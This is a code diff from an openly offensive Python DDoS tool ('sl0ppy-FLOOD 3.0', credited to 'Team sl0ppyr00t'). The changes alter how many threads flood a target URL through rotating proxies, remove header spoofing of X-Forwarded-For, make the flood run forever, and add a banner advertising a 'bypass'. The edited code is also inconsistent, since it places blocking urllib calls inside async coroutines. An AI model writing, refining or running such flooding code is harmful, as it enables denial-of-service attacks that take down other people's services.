@@ -8251,18 +8251,18 @@ class Spammer(threading.Thread):
         data = None
         if N >= (len(self.lista) - 1):
             N = 0
-        proxy = self.lista[N]
-        headers = self.headers.copy()
-        headers['X-Forwarded-For'] = '.'.join(str(random.randint(0, 255)) for _ in range(4))
-        async with session.get(self.url, data=data, headers=headers, proxy=proxy) as response:
-            await response.read()
+        proxy = urllib.request.ProxyHandler({'http': self.lista[N]})
+        opener = urllib.request.build_opener(proxy)
+        urllib.request.install_opener(opener)
+        req = urllib.request.Request(self.url, data, self.headers)
+        urllib.request.urlopen(req)
 
         print(Fore.RED + "0000000000000000000000000000")
         print(Fore.YELLOW + "DDoS, By Team sl0ppyr00t!!")
         print(Fore.RED + "0000000000000000000000000000")
         print(Style.RESET_ALL, end="")
 
-        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{proxy}")
+        sys.stdout.write(Fore.WHITE + f"Thread #{self.num:4d} | {N:4d}/{len(self.lista)} | Proxy@{self.lista[N]}")
         sys.stdout.flush()
         sys.stdout.write("\r")
 
@@ -8281,6 +8281,15 @@ class Spammer(threading.Thread):
                     await asyncio.sleep(random.uniform(0.1, 0.5))
                 except:
                     pass
+
+def title():
+    sys.stdout.write("                                                                                          \n")
+    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+    sys.stdout.write("             " + "0             sl0ppy-FLOOD 3.0              ""          0\n")
+    sys.stdout.write("             " + "0        ADDED NEW METHOD AND BYPASS    ""              0\n")
+    sys.stdout.write("             " + "0        ADDED NEW UA + Custom UA           ""          0\n")
+    sys.stdout.write("             " + "+0000000000000000000000000000000000000000000000000000000+\n")
+    sys.stdout.write("\n")
 
 class MainLoop():
     def __init__(self):
@@ -8334,8 +8343,10 @@ class MainLoop():
                 print('Invalid input. Please enter a number.')
 
         loop = asyncio.get_event_loop()
-        tasks = [Spammer(url, i + 1, proxy_list).run() for i in range(num_threads)]
-        loop.run_until_complete(asyncio.gather(*tasks))
+        for i in range(num_threads):
+            loop.create_task(Spammer(url, i + 1, proxy_list).run())
+
+        loop.run_forever()
 
 if __name__ == '__main__':
     N = 0
